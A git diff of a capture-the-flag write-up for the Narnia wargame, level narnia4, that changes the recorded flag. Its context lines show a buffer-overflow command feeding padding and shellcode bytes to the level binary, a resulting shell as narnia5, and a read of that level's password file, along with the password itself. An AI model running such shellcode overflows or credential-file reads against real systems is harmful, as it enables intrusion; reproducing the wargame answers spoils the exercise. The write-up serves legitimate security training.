@@ -5,7 +5,7 @@
 **Completion Date & Time :** 2026 - 02 - 11 / 20:58
 
 ---
-## FLAG : Ni3xHPEuuw
+## FLAG : `4VhyE9TRcd`
 
 ---
 ## Solution :
@@ -154,7 +154,7 @@ narnia4@narnia:/narnia$ /narnia/narnia4 $(perl -e 'print "A"x222 . "\x6a\x31\x58
 $ whoami
 narnia5
 $ cat /etc/narnia_pass/narnia5
-Ni3xHPEuuw
+4VhyE9TRcd
 ```
 
 ---
